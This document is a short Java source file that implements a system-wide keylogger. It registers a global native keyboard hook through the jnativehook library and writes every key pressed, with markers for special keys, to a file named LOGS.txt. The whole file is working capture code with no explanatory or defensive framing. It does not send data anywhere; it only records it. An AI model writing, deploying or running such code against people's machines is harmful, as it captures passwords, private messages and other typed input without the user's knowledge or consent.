package logger;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class MAIN implements NativeKeyListener {
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent kevent) {
		if (kevent.getKeyCode() == NativeKeyEvent.VC_ENTER) {
			System.out.println("");
		} else if (kevent.getKeyCode() == NativeKeyEvent.VC_SPACE) {
			System.out.print(" ");
		} else if (kevent.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
			System.out.println("[BKSP]");
		} else {
			System.out.print(NativeKeyEvent.getKeyText(kevent.getKeyCode()));
		}
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) { }
	
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) { }

	public static void main(String[] args) throws FileNotFoundException {
		// File stream for saving
		FileOutputStream fileOut = new FileOutputStream("LOGS.txt");

		System.setOut(new PrintStream(fileOut));
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.err.println("Problem registering native hook!");
			System.err.println("Error output: " + e);
			System.exit(1);
		}
		
		// Construct the example object and init the native hook.
		GlobalScreen.addNativeKeyListener(new MAIN());
	}
	
}
